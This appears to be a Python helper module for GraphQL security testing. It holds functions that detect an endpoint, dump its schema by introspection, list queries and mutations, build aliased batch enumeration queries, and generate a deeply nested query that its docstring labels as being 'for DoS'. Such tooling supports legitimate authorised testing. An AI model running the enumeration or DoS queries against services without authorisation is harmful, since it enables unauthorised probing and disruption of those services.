#!/usr/bin/env python3
"""
GraphQL Helper Script
===================
Helper functions for analyzing GraphQL endpoints and enumeration.

Usage:
    from scripts.graphql_helper import detect_graphql, enumerate_schema
"""

import json
import requests
from typing import Dict, List, Optional


INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type { name }
        args { name, type { kind } }
      }
    }
    queryType { fields { name } }
    mutationType { fields { name } }
    subscriptionType { fields { name } }
  }
}
"""


def detect_graphql(url: str) -> bool:
    """Detect if endpoint is GraphQL"""
    test_query = '{"query":"query{__typename}"}'
    
    try:
        response = requests.post(
            url,
            json=json.loads(test_query),
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        
        # GraphQL responds with __typename
        return "__typename" in response.text or "data" in response.text
    except Exception as e:
        print(f"[!] Detection error: {e}")
        return False


def enumerate_schema(url: str, auth_header: Optional[str] = None) -> Dict:
    """Enumerate GraphQL schema"""
    headers = {"Content-Type": "application/json"}
    
    if auth_header:
        headers["Authorization"] = auth_header
    
    try:
        response = requests.post(
            url,
            json={"query": INTROSPECTION_QUERY},
            headers=headers,
            timeout=10
        )
        
        data = response.json()
        
        if "errors" in data:
            return {"error": str(data["errors"])}
        
        return data.get("data", {})
    
    except Exception as e:
        return {"error": str(e)}


def find_queries(schema: Dict) -> List[str]:
    """Extract all available queries"""
    try:
        types = schema["__schema"]["types"]
        query_type = schema["__schema"]["queryType"]
        
        queries = []
        for field in query_type.get("fields", []):
            queries.append(field["name"])
        
        return queries
    except Exception:
        return []


def find_mutations(schema: Dict) -> List[str]:
    """Extract all available mutations"""
    try:
        mutation_type = schema["__schema"]["mutationType"]
        mutations = []
        
        for field in mutation_type.get("fields", []):
            mutations.append(field["name"])
        
        return mutations
    except Exception:
        return []


def generate_batch_query(query_name: str, param_name: str, 
                        param_values: List, limit: int = 100) -> str:
    """Generate batched enumeration query with aliases"""
    
    queries = []
    for i, value in enumerate(param_values[:limit]):
        alias = f"a{i}"
        queries.append(f'{alias}: {query_name}({param_name}: "{value}") {{ name id }}')
    
    return "{ " + " ".join(queries) + " }"


def generate_deep_query(depth: int = 20) -> str:
    """Generate deep recursion query for DoS"""
    
    nested = '{ friends ' * depth + '{ name }' + ' }' * depth
    return f"query {{ user {nested} }}"


# Example usage
if __name__ == "__main__":
    url = "https://api.example.com/graphql"
    
    print("[*] Detecting GraphQL...")
    if detect_graphql(url):
        print("[+] GraphQL endpoint found!")
        
        print("\n[*] Enumerating schema...")
        schema = enumerate_schema(url)
        
        if "error" not in schema:
            queries = find_queries(schema)
            mutations = find_mutations(schema)
            
            print(f"[+] Found {len(queries)} queries:")
            for q in queries[:10]:
                print(f"    - {q}")
            
            print(f"\n[+] Found {len(mutations)} mutations:")
            for m in mutations[:10]:
                print(f"    - {m}")
